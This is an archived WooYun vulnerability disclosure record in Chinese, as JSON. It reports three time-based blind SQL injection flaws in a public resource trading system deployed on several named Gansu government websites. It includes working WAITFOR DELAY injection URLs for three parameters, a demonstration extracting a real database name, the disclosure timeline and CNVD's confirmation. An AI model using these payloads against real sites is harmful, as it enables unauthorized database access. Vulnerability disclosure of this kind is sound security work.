{"id": 30423, "wybug_id": "wooyun-2015-0116596", "wybug_title": "某公共交易系统3处SQL注射漏洞", "wybug_corp": "甘肃成兴信息科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-05-28 11:06", "wybug_open_date": "2015-08-30 17:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["盲注", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-30：\t细节向公众公开  简要描述： 某公共交易系统3处SQL注射漏洞 详细说明：  存在漏洞的是甘肃成兴信息科技有限公司开发的公共交易系统案例：\nhttp://www.bygzjy.cn/  白银公共资源交易网http://www.gsggzyjy.cn/  甘肃公共资源交易网http://www.plsggzyjy.cn/ 平凉公共资源交易网http://121.40.131.71:8031/  武威市公共资源交易网http://www.jcggzy.com/   金昌市公共资源交易网http://zyggzy.com/  张掖市公共资源交易网\n3处注射详情：\n1.SiteItem判断数据库名长度：/infopage/infolist.aspx?InfoType=1&SiteItem=1'; if(len(db_name()))>=20 waitfor delay '0:0:5'--%20/infopage/infolist.aspx?InfoType=1&SiteItem=1'; if(len(db_name()))>=21 waitfor delay '0:0:5'--%20判断数据库名第一个字母的ASCII值：/infopage/infolist.aspx?InfoType=1&SiteItem=1';IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>=98) WAITFOR DELAY '0:0:5'--%20/infopage/infolist.aspx?InfoType=1&SiteItem=1';IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>=99) WAITFOR DELAY '0:0:5'--%202.InfoID/infopage/view.aspx?InfoID=1' IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>1) WAITFOR DELAY '0:0:5'--%20判断数据库名长度：/infopage/view.aspx?InfoID=1' if(len(db_name()))>=20 waitfor delay '0:0:5'--%20/infopage/view.aspx?InfoID=1' if(len(db_name()))>=21 waitfor delay '0:0:5'--%20判断数据库名第一个字母的ASCII值：/infopage/view.aspx?InfoID=1' IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>=98) WAITFOR DELAY '0:0:5'--%20/infopage/view.aspx?InfoID=1' IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>=99) WAITFOR DELAY '0:0:5'--%203.TenderProjectID判断数据库名长度：/infopage/infoprice.aspx?TenderProjectID=-1; if(len(db_name()))>=20 waitfor delay '0:0:5'--%20/infopage/infoprice.aspx?TenderProjectID=-1; if(len(db_name()))>=21 waitfor delay '0:0:5'--%20判断数据库名第一个字母的ASCII值：/infopage/infoprice.aspx?TenderProjectID=-1; IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>=98) WAITFOR DELAY '0:0:5'--%20/infopage/infoprice.aspx?TenderProjectID=-1; IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),1,1))>=99) WAITFOR DELAY '0:0:5'--%20\n   漏洞证明：  漏洞演示：以白银公共资源交易网(http://www.bygzjy.cn/)为例：由于都是盲注，以参数：SiteItem为例：1.判断当前数据库名长度:a.当设置数据库名长度>=20时，页面存在延时，即判断条件成立\n\nb.当设置数据库名长度>=21时，页面不存在延时，即判断条件不成立，即数据库名长度为20\n\n2.判断当前数据库名第一个字符的ASCII码值：a.设置数据库名第一个字符的ASCII码值>=98时，页面存在延时，即判断成立\n\nb.设置数据库名第一个字符的ASCII码值>=99时，页面不存在延时，即判断不成立，即当前数据库名第一个字符的ASCII码值为98，即字符b\n\n根据此方法依次可得出数据库名各个位对应的ASCII码值98 97 105 121 105 110 112 117 98 108 105 99 112 108 97 116 102 111 114 109 ，即数据库名为baiyinpublicplatform   修复方案：  对参数进行过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-06-01 17:31 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发给甘肃分中心，由其后续协调网站管理单位和厂商处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}